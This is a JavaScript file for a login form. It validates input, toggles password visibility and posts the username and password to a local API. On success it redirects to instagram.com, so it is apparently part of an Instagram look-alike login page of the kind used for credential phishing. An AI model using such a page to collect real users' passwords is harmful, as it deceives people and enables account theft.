const username = document.getElementById("username");
const password = document.getElementById("password");
const loginButton = document.getElementById("loginButton");
const togglePassword = document.getElementById("togglePassword");

togglePassword.addEventListener("click", function () {
  // toggle the type attribute
  const type =
    password.getAttribute("type") === "password" ? "text" : "password";
  password.setAttribute("type", type);

  // toggle the span textContent
  if (togglePassword.textContent.match("show")) {
    togglePassword.textContent = "hide";
  } else {
    togglePassword.textContent = "show";
  }
  // togglePassword.textContent === "show" ? "hide" : "show"
});

password.addEventListener("keyup", (event) => {
  if (password.value.length > 0) {
    togglePassword.style.display = "block";
  } else {
    togglePassword.style.display = "none";
  }
});

document.addEventListener("keyup", (event) => {
  isValidUsername = username.checkValidity();
  isValidPassword = password.value.length > 5 ? true : false;

  // console.log(username.value, password.value);

  if (isValidUsername & isValidPassword) {
    document.getElementById("loginButton").disabled = false;
  } else {
    document.getElementById("loginButton").disabled = true;
  }
});

// Using New Feature Fetch API .... ;))
function postLogin() {
  const data = {
    Username: username.value,
    Password: password.value,
  };

  fetch("/api/auth/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.Success) {
        window.location.href = "https://www.instagram.com/";
      } else {
        alert("Error mesage: " + data.Message);
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

/* Using Ajax , xmlhttprequest. ( demode :// )
function postLogin() {
const url = "/api/auth/login";
const xhr = new XMLHttpRequest();
const data = {
    Username: username.value,
    Password: password.value
}

xhr.open("POST", url, true);
xhr.onreadystatechange = (oEvent) => {
    if (xhr.readyState == 4 && this.status == 200) {
    window.location.href = "https://www.instagram.com/";
    } else {
    alert('Error mesage: ' + (JSON.parse(xhr.responseText).Message));
    }
}
xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
xhr.send(JSON.stringify(data));
}*/
